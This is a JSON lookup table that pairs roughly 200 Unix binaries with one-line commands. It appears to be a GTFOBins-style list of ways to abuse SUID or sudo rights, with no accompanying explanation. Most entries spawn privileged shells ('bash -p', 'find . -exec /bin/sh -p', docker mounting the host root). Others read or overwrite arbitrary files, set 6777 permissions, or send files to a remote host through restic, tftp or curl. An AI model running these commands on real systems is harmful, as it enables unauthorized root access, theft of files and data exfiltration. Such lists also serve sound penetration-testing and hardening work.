{
	"ab":"ab -p $LFILE $URL",
	"agetty":"agetty -o -p -l /bin/sh -a root tty",
	"alpine":"alpine -F \"$LFILE\"",
	"ar":"cat \"$TF\"",
	"arp":"arp -v -f \"$LFILE\"",
	"as":"as @$LFILE",
	"ash":"ash",
	"aspell":"aspell -c \"$LFILE\"",
	"atobm":"atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'",
	"awk":"awk '//' \"$LFILE\"",
	"base32":"base32 \"$LFILE\" | base32 --decode",
	"base64":"base64 \"$LFILE\" | base64 --decode",
	"basenc":"basenc --base64 $LFILE | basenc -d --base64",
	"basez":"basez \"$LFILE\" | basez --decode",
	"bash":"bash -p",
	"bc":"quit",
	"bridge":"bridge -b \"$LFILE\"",
	"busctl":"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",
	"busybox":"busybox sh",
	"bzip2":"bzip2 -c $LFILE | bzip2 -d",
	"cabal":"cabal exec -- /bin/sh -p",
	"capsh":"capsh --gid=0 --uid=0 --",
	"cat":"cat \"$LFILE\"",
	"chmod":"chmod 6777 $LFILE",
	"choom":"choom -n 0 -- /bin/sh -p",
	"chown":"chown $(id -un):$(id -gn) $LFILE",
	"chroot":"chroot / /bin/sh -p",
	"clamscan":"clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'",
	"cmp":"cmp $LFILE /dev/zero -b -l",
	"column":"column $LFILE",
	"comm":"comm $LFILE /dev/null 2>/dev/null",
	"cp":"echo \"DATA\" | cp /dev/stdin \"$LFILE\"",
	"cpio":"cat \"$TF/$LFILE\"",
	"cpulimit":"cpulimit -l 100 -f -- /bin/sh -p",
	"csh":"csh -b",
	"csplit":"cat xx01",
	"csvtool":"csvtool trim t $LFILE",
	"cupsfilter":"cupsfilter -i application/octet-stream -m application/octet-stream $LFILE",
	"curl":"curl $URL -o $LFILE",
	"cut":"cut -d \"\" -f1 \"$LFILE\"",
	"dash":"dash -p",
	"date":"date -f $LFILE",
	"dd":"echo \"data\" | dd of=$LFILE",
	"debugfs":"!/bin/sh",
	"dialog":"dialog --textbox \"$LFILE\" 0 0",
	"diff":"diff --line-format=%L /dev/null $LFILE",
	"dig":"dig -f $LFILE",
	"distcc":"distcc /bin/sh -p",
	"dmsetup":"dmsetup ls --exec '/bin/sh -p -s'",
	"docker":"docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
	"dosbox":"dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit",
	"ed":"q",
	"efax":"efax -d \"$LFILE\"",
	"elvish":"elvish",
	"emacs":"emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
	"env":"env /bin/sh -p",
	"eqn":"eqn \"$LFILE\"",
	"espeak":"espeak -qXf \"$LFILE\"",
	"expand":"expand \"$LFILE\"",
	"expect":"expect -c 'spawn /bin/sh -p;interact'",
	"file":"file -f $LFILE",
	"find":"find . -exec /bin/sh -p \\; -quit",
	"fish":"fish",
	"flock":"flock -u / /bin/sh -p",
	"fmt":"fmt -999 \"$LFILE\"",
	"fold":"fold -w99999999 \"$LFILE\"",
	"gawk":"gawk '//' \"$LFILE\"",
	"gcore":"gcore $PID",
	"gdb":"gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
	"genie":"genie -c '/bin/sh'",
	"genisoimage":"genisoimage -sort \"$LFILE\"",
	"gimp":"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
	"grep":"grep '' $LFILE",
	"gzip":"gzip -f $LFILE -t",
	"hd":"hd \"$LFILE\"",
	"head":"head -c1G \"$LFILE\"",
	"hexdump":"hexdump -C \"$LFILE\"",
	"highlight":"highlight --no-doc --failsafe \"$LFILE\"",
	"hping3":"/bin/sh -p",
	"iconv":"iconv -f 8859_1 -t 8859_1 \"$LFILE\"",
	"install":"install -m 6777 $LFILE $TF",
	"ionice":"ionice /bin/sh -p",
	"ip":"ip -force -batch \"$LFILE\"",
	"ispell":"!/bin/sh -p",
	"jjs":"echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs",
	"join":"join -a 2 /dev/null $LFILE",
	"jq":"jq -Rr . \"$LFILE\"",
	"jrunscript":"jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"",
	"julia":"julia -e 'run(`/bin/sh -p`)'",
	"ksh":"ksh -p",
	"ksshell":"ksshell -i $LFILE",
	"kubectl":"kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/",
	"ld.so":"ld.so /bin/sh -p",
	"less":"less file_to_read",
	"links":"links \"$LFILE\"",
	"logsave":"logsave /dev/null /bin/sh -i -p",
	"look":"look '' \"$LFILE\"",
	"lua":"lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'",
	"make":"make -s --eval=$'x:-'\"$COMMAND\"",
	"mawk":"mawk '//' \"$LFILE\"",
	"minicom":"press e, type /bin/sh -p, then Enter;",
	"more":"more file_to_read",
	"mosquitto":"mosquitto -c \"$LFILE\"",
	"msgattrib":"msgattrib -P $LFILE",
	"msgcat":"msgcat -P $LFILE",
	"msgconv":"msgconv -P $LFILE",
	"msgfilter":"echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'",
	"msgmerge":"msgmerge -P $LFILE /dev/null",
	"msguniq":"msguniq -P $LFILE",
	"multitime":"multitime /bin/sh -p",
	"mv":"mv $TF $LFILE",
	"nasm":"nasm -@ $LFILE",
	"nawk":"nawk '//' \"$LFILE\"",
	"ncftp":"!/bin/sh -p",
	"nft":"nft -f \"$LFILE\"",
	"nice":"nice /bin/sh -p",
	"nl":"nl -bn -w1 -s '' $LFILE",
	"nm":"nm @$LFILE",
	"nmap":"nmap -oG=$LFILE DATA",
	"node":"node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'",
	"nohup":"nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"",
	"ntpdate":"ntpdate -a x -k $LFILE -d localhost",
	"od":"od -An -c -w9999 \"$LFILE\"",
	"openvpn":"openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'",
	"pandoc":"echo DATA | pandoc -t plain -o \"$LFILE\"",
	"paste":"paste $LFILE",
	"perf":"perf stat /bin/sh -p",
	"perl":"perl -e 'exec \"/bin/sh\";'",
	"pexec":"pexec /bin/sh -p",
	"pg":"pg file_to_read",
	"php":"php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
	"pidstat":"pidstat -e $COMMAND",
	"pr":"pr -T $LFILE",
	"ptx":"ptx -w 5000 \"$LFILE\"",
	"python":"python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
	"rc":"rc -c '/bin/sh -p'",
	"readelf":"readelf -a @$LFILE",
	"restic":"restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"",
	"rev":"rev $LFILE | rev",
	"rlwrap":"rlwrap -H /dev/null /bin/sh -p",
	"rsync":"rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
	"rtorrent":"rtorrent",
	"rview":"rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
	"rvim":"rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
	"sash":"sash",
	"scanmem":"shell /bin/sh",
	"sed":"sed -e '' \"$LFILE\"",
	"setarch":"setarch $(arch) /bin/sh -p",
	"setfacl":"setfacl -m u:$USER:rwx $LFILE",
	"setlock":"setlock - /bin/sh -p",
	"shuf":"shuf -e DATA -o \"$LFILE\"",
	"soelim":"soelim \"$LFILE\"",
	"softlimit":"softlimit /bin/sh -p",
	"sort":"sort -m \"$LFILE\"",
	"ss":"ss -a -F $LFILE",
	"sshpass":"sshpass /bin/sh -p",
	"stdbuf":"stdbuf -i0 /bin/sh -p",
	"strace":"strace -o /dev/null /bin/sh -p",
	"strings":"strings \"$LFILE\"",
	"sysctl":"cat /tmp/id",
	"tac":"tac -s 'RANDOM' \"$LFILE\"",
	"tail":"tail -c1G \"$LFILE\"",
	"taskset":"taskset 1 /bin/sh -p",
	"tbl":"tbl $LFILE",
	"tclsh":"exec /bin/sh -p <@stdin >@stdout 2>@stderr",
	"tee":"echo DATA | tee -a \"$LFILE\"",
	"terraform":"file(\"file_to_read\")",
	"tftp":"put file_to_send",
	"tic":"tic -C \"$LFILE\"",
	"time":"time /bin/sh -p",
	"timeout":"timeout 7d /bin/sh -p",
	"troff":"troff $LFILE",
	"ul":"ul \"$LFILE\"",
	"unexpand":"unexpand -t99999999 \"$LFILE\"",
	"uniq":"uniq \"$LFILE\"",
	"unshare":"unshare -r /bin/sh",
	"unsquashfs":"squashfs-root/sh -p",
	"unzip":"sh -p",
	"uudecode":"uuencode \"$LFILE\" /dev/stdout | uudecode",
	"uuencode":"uuencode \"$LFILE\" /dev/stdout | uudecode",
	"vagrant":"vagrant up",
	"varnishncsa":"varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"",
	"view":"view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
	"vigr":"vigr",
	"vim":"vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
	"vimdiff":"vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
	"vipw":"vipw",
	"w3m":"w3m \"$LFILE\" -dump",
	"watch":"watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
	"wc":"wc --files0-from \"$LFILE\"",
	"wget":"wget --use-askpass=$TF 0",
	"whiptail":"whiptail --textbox --scrolltext \"$LFILE\" 0 0",
	"xargs":"xargs -a /dev/null sh -p",
	"xdotool":"xdotool exec --sync /bin/sh -p",
	"xmodmap":"xmodmap -v $LFILE",
	"xmore":"xmore $LFILE",
	"xxd":"xxd \"$LFILE\" | xxd -r",
	"xz":"xz -c \"$LFILE\" | xz -d",
	"yash":"yash",
	"zsh":"zsh",
	"zsoelim":"zsoelim \"$LFILE\""
}
